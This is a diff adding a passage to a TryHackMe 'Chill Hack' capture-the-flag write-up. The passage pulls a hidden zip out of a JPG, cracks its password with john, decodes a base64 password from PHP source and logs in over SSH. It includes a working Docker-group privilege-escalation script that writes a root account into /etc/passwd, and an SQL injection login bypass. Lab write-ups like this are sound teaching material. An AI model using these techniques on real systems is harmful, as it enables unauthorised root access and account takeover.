@@ -834,4 +834,282 @@ By the way, we are now able to authtenticate to login form:
 ![chillhack9](https://user-images.githubusercontent.com/42389836/147883292-3ea54f38-5c50-4ac8-8c75-6483f01f8045.png)
 
 
+It seems we got this static web page with no other resources.
+Since we read that we must "look in the dark", there is a suggestion about some steganographic technique.
+
+
+Let's download the jpg file and check with steghide tool:
+
+
+```
+# steghide info hacker-with-laptop_23-2147985341.jpg
+"hacker-with-laptop_23-2147985341.jpg":
+  format: jpeg
+  capacity: 3.6 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase:
+  embedded file "backup.zip":
+    size: 750.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+```
+
+
+There is a zip archive inside the jpg image.
+
+
+Let's extract it:
+
+
+```
+# stegseek --crack hacker-with-laptop_23-2147985341.jpg
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: ""
+[i] Original filename: "backup.zip".
+[i] Extracting to "hacker-with-laptop_23-2147985341.jpg.out".
+
+root@kaligra:/home/joshua# file hacker-with-laptop_23-2147985341.jpg.out
+hacker-with-laptop_23-2147985341.jpg.out: Zip archive data, at least v2.0 to extract
+
+
+
+root@kaligra:/home/joshua# unzip hacker-with-laptop_23-2147985341.jpg.out
+Archive:  hacker-with-laptop_23-2147985341.jpg.out
+[hacker-with-laptop_23-2147985341.jpg.out] source_code.php password:
+   skipping: source_code.php         incorrect password
+```
+
+We must find password for that zip file.
+
+
+Let's use john2zip:
+
+
+```
+# zip2john hacker-with-laptop_23-2147985341.jpg.out > toCrack
+ver 2.0 efh 5455 efh 7875 hacker-with-laptop_23-2147985341.jpg.out/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
+root@kali:/opt/TryHackMe/chillhack# cat toCrack
+hacker-with-laptop_23-2147985341.jpg.out/source_code.php:$pkzip2$1*2*2*0*22a*4bb*69dc82f3*0*49*8*22a*69dc*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip2$:source_code.php:hacker-with-laptop_23-2147985341.jpg.out::hacker-with-laptop_23-2147985341.jpg.out
+```
+
+And then run john again with "rockyou" wordlist:
+
+
+```
+# john --wordlist=/usr/share/wordlists/rockyou.txt toCrack
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+pass1word        (hacker-with-laptop_23-2147985341.jpg.out/source_code.php)
+1g 0:00:00:00 DONE (2022-01-02 11:41) 16.66g/s 204800p/s 204800c/s 204800C/s total90..hawkeye
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+
+Now we are able to look at source_code.php file:
+
+
+```
+# unzip hacker-with-laptop_23-2147985341.jpg.out
+Archive:  hacker-with-laptop_23-2147985341.jpg.out
+[hacker-with-laptop_23-2147985341.jpg.out] source_code.php password:
+replace source_code.php? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: source_code.php
+```
+
+
+```
+root@kali:/opt/TryHackMe/chillhack# cat source_code.php
+<html>
+<head>
+        Admin Portal
+</head>
+        <title> Site Under Development ... </title>
+        <body>
+                <form method="POST">
+                        Username: <input type="text" name="name" placeholder="username"><br><br>
+                        Email: <input type="email" name="email" placeholder="email"><br><br>
+                        Password: <input type="password" name="password" placeholder="password">
+                        <input type="submit" name="submit" value="Submit">
+                </form>
+<?php
+        if(isset($_POST['submit']))
+        {
+                $email = $_POST["email"];
+                $password = $_POST["password"];
+                if(base64_encode($password) == "IWQw[............]dzByZA==")
+                {
+                        $random = rand(1000,9999);?><br><br><br>
+                        <form method="POST">
+                                Enter the OTP: <input type="number" name="otp">
+                                <input type="submit" name="submitOtp" value="Submit">
+                        </form>
+                <?php   mail($email,"OTP for authentication",$random);
+                        if(isset($_POST["submitOtp"]))
+                                {
+                                        $otp = $_POST["otp"];
+                                        if($otp == $random)
+                                        {
+                                                echo "Welcome Anurodh!";
+                                                header("Location: authenticated.php");
+                                        }
+                                        else
+                                        {
+                                                echo "Invalid OTP";
+                                        }
+                                }
+                }
+                else
+                {
+                        echo "Invalid Username or Password";
+                }
+        }
+?>
+</html>
+```
+
+
+We found a string which looks like base64 encoded. Let's try:
+
+
+```
+# echo -n "IWQw[............]dzByZA==" | base64 -d
+!d0n[.......]sw0rd
+```
+
+
+Let's try SSH access with that password:
+
+
+```
+# ssh anurodh@10.10.94.161
+anurodh@10.10.94.161's password:
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Jan  2 17:11:04 UTC 2022
+
+  System load:  0.0                Processes:              119
+  Usage of /:   24.9% of 18.57GB   Users logged in:        1
+  Memory usage: 21%                IP address for eth0:    10.10.94.161
+  Swap usage:   0%                 IP address for docker0: 172.17.0.1
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+19 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+```
+
+We are in!
+
+
+We noticed that anurodh is member of docker group:
+
+
+```
+anurodh@ubuntu:~$ id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+```
+
+According to that URL:
+
+https://flast101.github.io/docker-privesc/
+
+
+We can try to obtain privesc by using docker, let's try:
+
+
+```
+anurodh@ubuntu:~$ cat > docker.sh
+#!/bin/bash
+
+docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 )
+
+if [ $(id -u) -eq 0 ]; then
+    echo "The user islready root. Have fun ;-)"
+    exit
+
+elif [ "$docker_test" == "CONTAINER ID" ]; then
+    echo 'Please write down your new root credentials.'
+    read -p 'Choose a root user name: ' rootname
+    read -s -p 'Choose a root password: ' passw
+    hpass=$(openssl passwd -1 -salt mysalt $passw)
+
+    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
+    mv new_account /tmp/new_account
+    docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
+    docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
+    sleep 1; echo '...'
+
+    echo 'Success! Root user ready. Enter your password to login as root:'
+    docker rm -f flast101.github.io
+    docker image rm alpine
+    rm /tmp/new_account
+    su $rootname
+
+else echo "Your account does not have permission to execute docker or docker is not running, aborting..."
+    exit
+
+fi
+
+
+
+```
+
+Let's run that script:
+
+
+```
+anurodh@ubuntu:~$ ./docker.sh
+Please write down your new root credentials.
+Choose a root user name: sugo
+Choose a root password: 4ac801b38b230418fbb1f43790796587d6e9565c9928ce3d4dbe446736885abf
+...
+Success! Root user ready. Enter your password to login as root:
+flast101.github.io
+Untagged: alpine:latest
+Untagged: alpine@sha256:185518070891758909c9f839cf4ca393ee977ac378609f700f60a771a2dfe321
+Deleted: sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e
+Deleted: sha256:50644c29ef5a27c9a40c393a73ece2479de78325cae7d762ef3cdc19bf42dd0a
+Password:
+root@ubuntu:/home/anurodh# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:/home/anurodh# cd
+root@ubuntu:~# ls
+proof.txt
+```
+
+We got root and we are able to grab proof.txt file!
+
+
+#### Notes
+
+Login form is actually vulnerable to SQLi, so you can bypass it with very basic injection like 
+
+
+```' or 1=1-- -```
+
+
+
 
